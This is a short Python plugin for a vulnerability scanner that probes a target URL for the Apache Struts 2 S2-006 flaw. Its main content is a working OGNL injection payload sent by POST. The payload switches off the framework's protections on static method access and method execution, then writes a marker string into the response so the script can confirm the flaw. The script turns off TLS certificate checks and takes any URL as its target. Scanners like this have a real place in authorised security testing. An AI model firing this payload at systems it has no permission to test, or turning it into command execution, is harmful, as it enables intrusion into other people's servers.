#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'orleven'

import time
import requests
requests.packages.urllib3.disable_warnings()


def get_script_info(data=None):
    script_info = {
        "name": "Struts 2-006",
        "info": "Struts 2-006.",
        "level": "high",
        "type": "info",
    }
    return script_info


def prove(data):
    data = init(data, 'web')
    if data['url'] != None:
        try:
            prove_poc = "('#_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('#context[\'xwork.MethodAccessor.denyMethodExecution\']=false')(b))&('#c')(('#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET')(c))&(g)(('#req=@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('#xman=@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('#xman=@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('#xman.getWriter().println(%22@struts2_006_vul@%22)')(d))&(i99)(('#xman.getWriter().close()')(d))=1"
            poc_key = '''@struts2_006_vul@'''
            res = requests.post(data['url'], headers=data['headers'], verify=False, data=prove_poc,timeout=data['timeout']).text
            if res and res.find(poc_key) != -1:
                data['flag'] = 1
                data['data'].append({"poc": prove_poc})
                data['res'].append({"info": prove_poc, "key": "struts2_006_vul"})
        except:
            pass
    return data